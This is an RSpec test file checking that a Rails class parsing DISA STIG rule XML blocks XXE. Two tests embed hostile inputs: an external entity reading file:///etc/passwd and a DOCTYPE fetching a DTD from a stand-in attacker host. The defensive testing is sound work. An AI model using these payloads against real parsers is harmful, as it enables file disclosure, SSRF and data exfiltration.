# frozen_string_literal: true

require 'rails_helper'

RSpec.describe DisaRuleDescription do
  describe '.from_mapping' do
    it 'parses a valid DISA rule description' do
      xml = '<VulnDiscussion>This is a test.</VulnDiscussion>' \
            '<FalsePositives></FalsePositives>' \
            '<FalseNegatives></FalseNegatives>' \
            '<Documentable>false</Documentable>' \
            '<Mitigations></Mitigations>' \
            '<SeverityOverrideGuidance></SeverityOverrideGuidance>' \
            '<PotentialImpact></PotentialImpact>' \
            '<ThirdPartyTools></ThirdPartyTools>' \
            '<MitigationControl></MitigationControl>' \
            '<Responsibility></Responsibility>' \
            '<IAControls></IAControls>'

      result = described_class.from_mapping(xml.dup)
      expect(result).to be_a(Hash)
      expect(result[:vuln_discussion]).to eq('This is a test.')
      expect(result[:documentable]).to eq('false')
    end

    it 'does NOT expand XML external entities (XXE prevention)' do
      # An attacker could craft a STIG XML with an XXE payload in the description field.
      # If NOENT is enabled, Nokogiri will expand entities like &xxe; to file contents.
      # This test ensures entity expansion is blocked.
      xxe_payload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' \
                    '<VulnDiscussion>&xxe;</VulnDiscussion>'

      result = described_class.from_mapping(xxe_payload.dup)

      # The entity should NOT be expanded to file contents.
      # With NONET and no NOENT, the entity reference is either stripped or left unexpanded.
      # In no case should /etc/passwd contents appear.
      expect(result).to be_nil.or(satisfy { |r|
        vuln = r[:vuln_discussion]
        vuln.nil? || (vuln.exclude?('root:') && vuln.exclude?('/bin/'))
      })
    end

    it 'does NOT fetch external DTDs (NONET flag)' do
      # External DTD fetching could be used for SSRF or data exfiltration.
      # The NONET flag prevents any network access during XML parsing.
      external_dtd = '<!DOCTYPE foo SYSTEM "http://evil.example.com/xxe.dtd">' \
                     '<VulnDiscussion>Test</VulnDiscussion>'

      # Should not raise a network error or hang — NONET blocks it silently with RECOVER
      result = described_class.from_mapping(external_dtd.dup)
      # As long as it doesn't hang or fetch, we're good
      expect(result).to be_nil.or(be_a(Hash))
    end
  end
end
